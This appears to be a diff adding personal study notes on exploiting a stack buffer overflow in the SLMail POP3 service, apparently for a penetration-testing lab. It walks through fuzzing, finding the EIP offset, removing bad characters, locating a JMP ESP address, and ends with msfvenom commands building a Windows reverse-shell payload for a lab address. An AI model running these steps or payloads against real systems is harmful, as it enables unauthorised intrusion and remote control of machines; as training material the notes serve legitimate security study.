@@ -1,0 +1,52 @@
+#fuzzing for buffer overflows
+see python fuzzer script
+
+#the fuzzing process involves running a potentially vulnerable process within a debugger in order to analyze the stack as potentially erroneous input is introduced
+
+#a simple exploit script
+slmail-pop3.py
+
+#create a unique string using ruby's pattern create module
+locate pattern_create
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb 2700
+
+#copy the pattern into the exploit script in order to identify the address of the EIP register
+see slmail-pop3-updated.py
+
+#use the pattern_offset ruby script to find the location of the unique string
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb {search string}
+
+#update buffer to match the string based on the length returned by pattern_offset
+
+#once the proper offset has been determined, create shellcode in your buffer for the EIP to jump to
+#it may be necessary to create a larger buffer to provide enough space for useful shellcode
+
+#make sure your shellcode does not contain any bad characters like Null or character returns, depending on the application you're exploiting
+
+#once all bad characters have been identified/eliminated, overwrite the ESP to point to the start of the shellcode
+
+#overwriting the ESP directly may not work since the memory address is effectively random
+#instead, find a jump ESP instruction at a known location and use that to get to the ESP instead
+
+#there may be modules that assist in doing this, in the example, using immunity debugger, search for !mona modules
+
+#you can then look for modules/DLLs with known load locations on the stack and exploit those based on DLLs that the vulnerable process loads
+
+#you can search for the jump ESP instruction in broader memory locations if it is not in the DLLs
+#using the mona scripts. Search for the specific opcode using:
+ruby /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
+
+#plug into nasm:
+jmp ESP
+#returns FFE4, this is the opcode for jmp esp
+
+#note big-endian vs little-endian addresses, use the right one
+
+#once you redirect the execution properly, use msfvenom to create your payload
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.30.5 LPORT=443 -f c -a x86 --platform windows
+#this specifies 32-bit windows
+
+#shellcode generation may contain bad characters, so we need to tell msfvenom to not use them
+msfvenom -o windows/shell_reverse_tcp LHOST=192.168.30.5 LPORT=443 -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai
+
+#you may need a nop-sled to avoid having the encoder overwrite your own shellcode
